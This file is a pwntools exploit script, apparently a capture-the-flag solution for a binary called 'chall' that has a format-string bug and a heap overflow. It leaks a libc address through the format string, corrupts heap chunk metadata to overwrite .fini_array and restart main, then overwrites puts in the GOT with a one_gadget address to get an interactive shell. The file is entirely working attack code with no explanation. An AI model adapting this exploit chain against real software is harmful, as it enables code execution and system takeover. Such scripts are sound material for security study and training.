#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
        b main
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def add_code(buf):
    p.recvuntil(">")
    p.sendline(buf)

## avaiable commands ##
# sing  : print arg (with FSB)
# erase : erase lyric of index
# write : write lyric to index

# 0x20 bytes heap overflow
# chunk size == 0x20

# restart main
payload = b'A' * 0x20
payload += p64(0)
payload += p64(0x31)
payload += p64(elf.get_section_by_name(".fini_array").header["sh_addr"])
payload += p64(0)
add_code(b"write %0 JUNK%53$p")
add_code(b"sing %0")# leak __libc_start_main+250
add_code(b"BBBBBBBB")
add_code(payload)
add_code(p64(elf.symbols['main']))

p.recvuntil("🎵JUNK")
leak = eval(p.recv(14))
log.info("leak: " + hex(leak))
libc_base = leak - libc.symbols['__libc_start_main'] - 250
log.info("libc base: " + hex(libc_base))
one_gadget_addr = libc_base + 0xe6c7e

payload = b'A' * 0x20
payload += p64(0)
payload += p64(0x31)
payload += p64(elf.got['puts'])
payload += p64(0)

add_code(b"CCCCCCCC")
add_code(b"DDDDDDDD")
add_code(b"EEEEEEEE")
add_code(payload)
add_code(p64(one_gadget_addr))

p.interactive()
